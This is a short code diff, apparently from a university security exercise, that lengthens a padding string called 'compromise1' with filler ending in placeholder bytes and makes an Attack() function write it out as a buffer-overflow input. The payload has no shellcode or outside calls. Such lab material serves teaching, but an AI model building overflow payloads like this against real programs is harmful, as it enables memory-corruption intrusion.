@@ -106,14 +106,16 @@ char * compromise1=
     "xxxxxxxxxxxxxxxxxxxx"
     "xxxxxxxxxxxxxxxxxxxx"
     "xxxxxxxxxxxxxxxxxxxx"
-    "xxxxxxxxxxxxxxxxxxxx" // 40
-    "xxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxx"
     "MNOPWXYZ"
     "xxxxxxxx\n";
 
 // change to write so we can write NULLs
 void Attack(FILE * outfile){
-    fprintf(outfile, "%s", "377 Student\n");  
+    fprintf(outfile, "%s", compromise1);  
     fflush(outfile);
 }
 
